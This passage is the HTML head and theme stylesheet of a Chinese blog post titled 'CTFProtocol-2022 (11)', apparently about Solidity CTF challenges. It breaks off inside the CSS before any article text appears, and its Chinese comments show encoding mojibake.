<!DOCTYPE html>
<html lang="zh-CN">
    <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/#5.8.0'>
  <meta name="generator" content="Hexo 6.3.0">
  <meta name="Volantis" content="5.8.0">
  <meta charset="utf-8">
  <!-- SEOç›¸å…³ -->
  
  <link rel="canonical" href="https://biyouqiuqiu.com/2023/09/01/smart contracts/ctfprotocol/ctfprotocol/"/>
  <!-- æ¸²æŸ“ä¼˜åŒ– -->
    <meta http-equiv='x-dns-prefetch-control' content='on' />
      <link rel='dns-prefetch' href='https://unpkg.com'>
      <link rel="preconnect" href="https://unpkg.com" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Content-Security-Policy" content=" default-src 'self' https:; block-all-mixed-content; base-uri 'self' https:; form-action 'self' https:; worker-src 'self' https:; connect-src 'self' https: *; img-src 'self' data: https: *; media-src 'self' https: *; font-src 'self' data: https: *; frame-src 'self' https: *; manifest-src 'self' https: *; child-src https:; script-src 'self' https: 'unsafe-inline' *; style-src 'self' https: 'unsafe-inline' *; ">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
  <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
  <meta content="telephone=no" name="format-detection">
  <!-- import head_begin begin -->
  <!-- import head_begin end -->
  <!-- Custom Files headBegin begin-->
  
  <!-- Custom Files headBegin end-->
  <!-- front-matter head_begin begin -->
  <!-- front-matter head_begin end -->
    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202306012119952.png">
  <link rel="preload" href="/css/style.css" as="style">
  <link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
<link rel="preload" href="https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <!-- feed -->
  <!-- é¡µé¢å…ƒæ•°æ® -->
  <title>CTFProtocol-2022ï¼ˆ11ï¼‰ - BY_DLIFEğŸ‰</title>
  <meta name="keywords" content="soliditiy,é¶åœº,null">
  <meta desc name="description" content="Self-Discipline - BY_DLIFEğŸ‰ - BY_DLIFEğŸ‰">
  
<meta property="og:type" content="article">
<meta property="og:title" content="CTFProtocol-2022ï¼ˆ11ï¼‰">
<meta property="og:url" content="https://biyouqiuqiu.com/2023/09/01/Smart%20contracts/CTFProtocol/CTFProtocol/index.html">
<meta property="og:site_name" content="BY_DLIFEğŸ‰">
<meta property="og:description" content="ç”±ç®€å…¥éš¾ The Lost Kitty1. question Lucas is a scientist who lives with his cat in a big house that has 2^256 rooms. His cat likes to play hide and seek and jumps to a random room whenever it hears a door">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
<meta property="article:published_time" content="2023-09-01T04:50:10.000Z">
<meta property="article:modified_time" content="2023-09-01T04:50:10.000Z">
<meta property="article:author" content="BY_DLIFEğŸ‰">
<meta property="article:tag" content="soliditiy">
<meta property="article:tag" content="é¶åœº">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
  <style>
    /* é¦–å±æ ·å¼ */
    #safearea {
  display: none;
}
:root {
  --color-site-body: #f4f4f4;
  --color-site-bg: #f4f4f4;
  --color-site-inner: #eee;
  --color-site-footer: #000;
  --color-card: #fff;
  --color-text: #000;
  --color-block: #f6f6f6;
  --color-inlinecode: #000;
  --color-codeblock: #fff7ea;
  --color-h1: #3a3a3a;
  --color-h2: #3a3a3a;
  --color-h3: #333;
  --color-h4: #444;
  --color-h5: #555;
  --color-h6: #666;
  --color-p: #444;
  --color-list: #000;
  --color-list-hl: #30ad91;
  --color-meta: #888;
  --color-read-bkg: #e0d8c8;
  --color-read-post: #f8f1e2;
  --color-copyright-bkg: #ffdead;
}
* {
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  outline: none;
  margin: 0;
  padding: 0;
}
*::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
*::-webkit-scrollbar-track-piece {
  background: transparent;
}
*::-webkit-scrollbar-thumb {
  background: #3dd9b6;
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
*::-webkit-scrollbar-thumb:hover {
  background: #ff5722;
}
html {
  color: var(--color-text);
  width: 100%;
  height: 100%;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  font-size: 16px;
}
html >::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
html >::-webkit-scrollbar-track-piece {
  background: transparent;
}
html >::-webkit-scrollbar-thumb {
  background: #54b5a0 linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0.4) 75%, transparent 75%, transparent);
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
html >::-webkit-scrollbar-thumb:hover {
  background: #54b5a0 linear-gradient(45deg, rgba(255,255,255,0.4) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.4) 50%, rgba(255,255,255,0.4) 75%, transparent 75%, transparent);
}
body {
  background-color: var(--color-site-body);
  text-rendering: optimizelegibility;
  -webkit-tap-highlight-color: rgba(0,0,0,0);
  line-height: 1.6;
  -webkit-text-size-adjust: 100%;
  -ms-text-size-adjust: 100%;
}
body.modal-active {
  overflow: hidden;
}
@media screen and (max-width: 680px) {
  body.modal-active {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
  }
}
a {
  color: #16f4ef;
  cursor: pointer;
  text-decoration: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
a:hover {
  color: #ff5722;
}
a:active,
a:hover {
  outline: 0;
}
ul,
ol {
  padding-left: 0;
}
ul li,
ol li {
  list-style: none;
}
header {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
img {
  border: 0;
  background: none;
  max-width: 100%;
}
svg:not(:root) {
  overflow: hidden;
}
hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  height: 0;
  border: 0;
  border-radius: 1px;
  -webkit-border-radius: 1px;
  border-bottom: 1px solid rgba(0,0,0,0.1);
}
button,
input {
  color: inherit;
  font: inherit;
  margin: 0;
}
button {
  overflow: visible;
  text-transform: none;
  -webkit-appearance: button;
  cursor: pointer;
}
@supports (backdrop-filter: blur(20px)) {
  .blur {
    background: rgba(255,255,255,0.9) !important;
    backdrop-filter: saturate(200%) blur(20px);
  }
}
.shadow {
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.shadow.floatable {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.shadow.floatable:hover {
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
}
#l_cover {
  min-height: 64px;
}
.cover-wrapper {
  top: 0;
  left: 0;
  max-width: 100%;
  height: 100vh;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  align-self: center;
  align-content: center;
  color: var(--color-site-inner);
  padding: 0 16px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  position: relative;
  overflow: hidden;
  margin-bottom: -100px;
}
.cover-wrapper .cover-bg {
  position: absolute;
  width: 100%;
  height: 100%;
  background-position: center;
  background-size: cover;
  -webkit-background-size: cover;
  -moz-background-size: cover;
}
.cover-wrapper .cover-bg.lazyload:not(.loaded) {
  opacity: 0;
  -webkit-opacity: 0;
  -moz-opacity: 0;
}
.cover-wrapper .cover-bg.lazyload.loaded {
  animation-delay: 0s;
  animation-duration: 0.5s;
  animation-fill-mode: forwards;
  animation-timing-function: ease-out;
  animation-name: fadeIn;
}
@-moz-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
    transform: scale(1.02);
    -webkit-transform: scale(1.02);
    -khtml-transform: scale(1.02);
    -moz-transform: scale(1.02);
    -o-transform: scale(1.02);
    -ms-transform: scale(1.02);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.cover-wrapper .cover-body {
  z-index: 1;
  position: relative;
  width: 100%;
  height: 100%;
}
.cover-wrapper#full {
  height: calc(100vh + 100px);
  padding-bottom: 100px;
}
.cover-wrapper#half {
  max-height: 640px;
  min-height: 400px;
  height: calc(36vh - 64px + 200px);
}
.cover-wrapper #scroll-down {
  width: 100%;
  height: 64px;
  position: absolute;
  bottom: 100px;
  text-align: center;
  cursor: pointer;
}
.cover-wrapper #scroll-down .scroll-down-effects {
  color: #fff;
  font-size: 24px;
  line-height: 64px;
  position: absolute;
  width: 24px;
  left: calc(50% - 12px);
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
  animation: scroll-down-effect 1.5s infinite;
  -webkit-animation: scroll-down-effect 1.5s infinite;
  -khtml-animation: scroll-down-effect 1.5s infinite;
  -moz-animation: scroll-down-effect 1.5s infinite;
  -o-animation: scroll-down-effect 1.5s infinite;
  -ms-animation: scroll-down-effect 1.5s infinite;
}
@-moz-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.cover-wrapper .cover-body {
  margin-top: 64px;
  margin-bottom: 100px;
}
.cover-wrapper .cover-body,
.cover-wrapper .cover-body .top,
.cover-wrapper .cover-body .bottom {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  max-width: 100%;
}
.cover-wrapper .cover-body .bottom {
  margin-top: 32px;
}
.cover-wrapper .cover-body .title {
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
  font-size: 3.125rem;
  line-height: 1.2;
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
}
.cover-wrapper .cover-body .subtitle {
  font-size: 20px;
}
.cover-wrapper .cover-body .logo {
  max-height: 120px;
  max-width: calc(100% - 4 * 16px);
}
@media screen and (min-height: 1024px) {
  .cover-wrapper .cover-body .title {
    font-size: 3rem;
  }
  .cover-wrapper .cover-body .subtitle {
    font-size: 1.05rem;
  }
  .cover-wrapper .cover-body .logo {
    max-height: 150px;
  }
}
.cover-wrapper .cover-body .m_search {
  position: relative;
  max-width: calc(100% - 16px);
  width: 320px;
  vertical-align: middle;
}
.cover-wrapper .cover-body .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  width: 100%;
}
.cover-wrapper .cover-body .m_search .icon,
.cover-wrapper .cover-body .m_search .input {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.cover-wrapper .cover-body .m_search .icon {
  position: absolute;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  line-height: 2.5rem;
  width: 32px;
  top: 0;
  left: 5px;
  color: rgba(68,68,68,0.75);
}
.cover-wrapper .cover-body .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  height: 2.5rem;
  width: 100%;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  font-size: 0.875rem;
  -webkit-appearance: none;
  padding-left: 36px;
  border-radius: 1.4rem;
  -webkit-border-radius: 1.4rem;
  background: rgba(255,255,255,0.6);
  backdrop-filter: blur(10px);
  border: none;
  color: var(--color-text);
}
@media screen and (max-width: 500px) {
  .cover-wrapper .cover-body .m_search .input {
    padding-left: 36px;
  }
}
.cover-wrapper .cover-body .m_search .input:hover {
  background: rgba(255,255,255,0.8);
}
.cover-wrapper .cover-body .m_search .input:focus {
  background: #fff;
}
.cover-wrapper .list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  flex-wrap: wrap;
  -webkit-flex-wrap: wrap;
  -khtml-flex-wrap: wrap;
  -moz-flex-wrap: wrap;
  -o-flex-wrap: wrap;
  -ms-flex-wrap: wrap;
  align-items: stretch;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.cover-wrapper .list-h a {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 0;
  -ms-flex: 1 0;
  flex: 1 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  font-weight: 600;
}
.cover-wrapper .list-h a img {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  border-radius: 2px;
  -webkit-border-radius: 2px;
  margin: 4px;
  min-width: 40px;
  max-width: 44px;
}
@media screen and (max-width: 768px) {
  .cover-wrapper .list-h a img {
    min-width: 36px;
    max-width: 40px;
  }
}
@media screen and (max-width: 500px) {
  .cover-wrapper .list-h a img {
    margin: 2px 4px;
    min-width: 32px;
    max-width: 36px;
  }
}
@media screen and (max-width: 375px) {
  .cover-wrapper .list-h a img {
    min-width: 28px;
    max-width: 32px;
  }
}
.cover-wrapper {
  max-width: 100%;
}
.cover-wrapper.search .bottom .menu {
  margin-top: 16px;
}
.cover-wrapper.search .bottom .menu .list-h a {
  white-space: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  align-items: baseline;
  padding: 2px;
  margin: 4px;
  color: var(--color-site-inner);
  opacity: 0.75;
  -webkit-opacity: 0.75;
  -moz-opacity: 0.75;
  text-shadow: 0 1px 2px rgba(0,0,0,0.05);
  border-bottom: 2px solid transparent;
}
.cover-wrapper.search .bottom .menu .list-h a i {
  margin-right: 4px;
}
.cover-wrapper.search .bottom .menu .list-h a p {
  font-size: 0.9375rem;
}
.cover-wrapper.search .bottom .menu .list-h a:hover,
.cover-wrapper.search .bottom .menu .list-h a.active,
.cover-wrapper.search .bottom .menu .list-h a:active {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
  border-bottom: 2px solid var(--color-site-inner);
}
@media (prefers-color-scheme: dark) {
  :root {
    --color-mode: 'dark';
  }
  :root:not([color-scheme]) {
    --color-site-body: #121212;
    --color-read-bkg: #1f1f1f;
    --color-read-post: #262626;
    --color-site-bg: #1f1f1f;
    --color-site-inner: rgba(238,238,238,0.871);
    --color-site-footer: rgba(170,170,170,0.871);
    --color-card: #262626;
    --color-text: rgba(238,238,238,0.871);
    --color-block: #434343;
    --color-codeblock: #c0c0c0;
    --color-inlinecode: #000;
    --color-h1: rgba(255,255,255,0.871);
    --color-h2: rgba(255,255,255,0.871);
    --color-h3: rgba(255,255,255,0.6);
    --color-h4: rgba(255,255,255,0.6);
    --color-h5: rgba(255,255,255,0.6);
    --color-h6: rgba(255,255,255,0.6);
    --color-p: rgba(217,217,217,0.871);
    --color-list: rgba(217,217,217,0.871);
    --color-list-hl: #63e0c4;
    --color-meta: rgba(191,191,191,0.871);
    --color-link: rgba(191,191,191,0.871);
    --color-copyright-bkg: #21252b;
  }
  :root:not([color-scheme]) img {
    filter: brightness(70%) !important;
  }
  :root:not([color-scheme]) .blur {
    background: rgba(31,31,31,0.9) !important;
  }
  :root:not([color-scheme]) .white-box.blur {
    background: rgba(38,38,38,0.9) !important;
  }
  :root:not([color-scheme]) .nav-main .u-search-input {
    background: var(--color-card) !important;
  }
  :root:not([color-scheme]) #l_main .article .prev-next>a {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) #l_main .article .prev-next>a:hover {
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) .article blockquote {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .article-title a {
    color: var(--color-h1) !important;
  }
  :root:not([color-scheme]) details>summary {
    color: var(--color-p) !important;
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) details {
    border: 1px solid var(--color-site-bg) !important;
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) #u-search .modal,
  :root:not([color-scheme]) #u-search .modal-header,
  :root:not([color-scheme]) #u-search .modal-body {
    background: var(--color-card) !important;
  }
  :root:not([color-scheme]) #u-search .modal-body .modal-results .result:hover {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .u-search-input:hover {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .u-search-input:focus {
    background: var(--color-site-body) !important;
  }
}
[color-scheme='dark'] {
  --color-site-body: #121212;
  --color-read-bkg: #1f1f1f;
  --color-read-post: #262626;
  --color-site-bg: #1f1f1f;
  --color-site-inner: rgba(238,238,238,0.871);
  --color-site-footer: rgba(170,170,170,0.871);
  --color-card: #262626;
  --color-text: rgba(238,238,238,0.871);
  --color-block: #434343;
  --color-codeblock: #c0c0c0;
  --color-inlinecode: #000;
  --color-h1: rgba(255,255,255,0.871);
  --color-h2: rgba(255,255,255,0.871);
  --color-h3: rgba(255,255,255,0.6);
  --color-h4: rgba(255,255,255,0.6);
  --color-h5: rgba(255,255,255,0.6);
  --color-h6: rgba(255,255,255,0.6);
  --color-p: rgba(217,217,217,0.871);
  --color-list: rgba(217,217,217,0.871);
  --color-list-hl: #63e0c4;
  --color-meta: rgba(191,191,191,0.871);
  --color-link: rgba(191,191,191,0.871);
  --color-copyright-bkg: #21252b;
}
[color-scheme='dark'] img {
  filter: brightness(70%) !important;
}
[color-scheme='dark'] .blur {
  background: rgba(31,31,31,0.9) !important;
}
[color-scheme='dark'] .white-box.blur {
  background: rgba(38,38,38,0.9) !important;
}
[color-scheme='dark'] .nav-main .u-search-input {
  background: var(--color-card) !important;
}
[color-scheme='dark'] #l_main .article .prev-next>a {
  background: var(--color-block) !important;
}
[color-scheme='dark'] #l_main .article .prev-next>a:hover {
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] .article blockquote {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .article-title a {
  color: var(--color-h1) !important;
}
[color-scheme='dark'] details>summary {
  color: var(--color-p) !important;
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] details {
  border: 1px solid var(--color-site-bg) !important;
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] #u-search .modal,
[color-scheme='dark'] #u-search .modal-header,
[color-scheme='dark'] #u-search .modal-body {
  background: var(--color-card) !important;
}
[color-scheme='dark'] #u-search .modal-body .modal-results .result:hover {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .u-search-input:hover {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .u-search-input:focus {
  background: var(--color-site-body) !important;
}
@media screen and (max-width: 500px) {
  [color-scheme='dark'] .l_header .m_search {
    background: var(--color-site-bg) !important;
  }
}
@font-face {
  font-family: 'Helvetica';
  src: url("https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
@font-face {
  font-family: 'Varela Round';
  src: url("https://unpkg.com/volantis-static@0.0.1654736714924/media/fonts/VarelaRound/VarelaRound-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
.l_header {
  position: fixed;
  z-index: 1000;
  top: 0;
  width: 100%;
  height: 64px;
  background: var(--color-card);
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.l_header.auto {
  transition: opacity 0.4s ease;
  -webkit-transition: opacity 0.4s ease;
  -khtml-transition: opacity 0.4s ease;
  -moz-transition: opacity 0.4s ease;
  -o-transition: opacity 0.4s ease;
  -ms-transition: opacity 0.4s ease;
  visibility: hidden;
}
.l_header.auto.show {
  opacity: 1 !important;
  -webkit-opacity: 1 !important;
  -moz-opacity: 1 !important;
  visibility: visible;
}
.l_header .container {
  margin-left: 16px;
  margin-right: 16px;
}
.l_header #wrapper {
  height: 100%;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.l_header #wrapper .nav-main,
.l_header #wrapper .nav-sub {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  justify-content: space-between;
  -webkit-justify-content: space-between;
  -khtml-justify-content: space-between;
  -moz-justify-content: space-between;
  -o-justify-content: space-between;
  -ms-justify-content: space-between;
  align-items: center;
}
.l_header #wrapper .nav-main {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.l_header #wrapper.sub .nav-main {
  transform: translateY(-64px);
  -webkit-transform: translateY(-64px);
  -khtml-transform: translateY(-64px);
  -moz-transform: translateY(-64px);
  -o-transform: translateY(-64px);
  -ms-transform: translateY(-64px);
}
.l_header #wrapper .nav-sub {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  opacity: 0;
  -webkit-opacity: 0;
  -moz-opacity: 0;
  height: 64px;
  width: calc(100% - 2 * 16px);
  position: absolute;
}
.l_header #wrapper .nav-sub ::-webkit-scrollbar {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (min-width: 2048px) {
  .l_header #wrapper .nav-sub {
    max-width: 55vw;
    margin: auto;
  }
}
.l_header #wrapper.sub .nav-sub {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
}
.l_header #wrapper .title {
  position: relative;
  color: var(--color-text);
  padding-left: 24px;
  max-height: 64px;
}
.l_header #wrapper .nav-main .title {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-shrink: 0;
  line-height: 64px;
  padding: 0 24px;
  font-size: 1.25rem;
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
}
.l_header #wrapper .nav-main .title img {
  height: 64px;
}
.l_header .nav-sub {
  max-width: 1080px;
  margin: auto;
}
.l_header .nav-sub .title {
  font-weight: bold;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  line-height: 1.2;
  max-height: 64px;
  white-space: normal;
  flex-shrink: 1;
}
.l_header .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  line-height: 64px;
  align-items: center;
}
.l_header .switcher .s-toc {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
}
@media screen and (max-width: 768px) {
  .l_header .switcher .s-toc {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
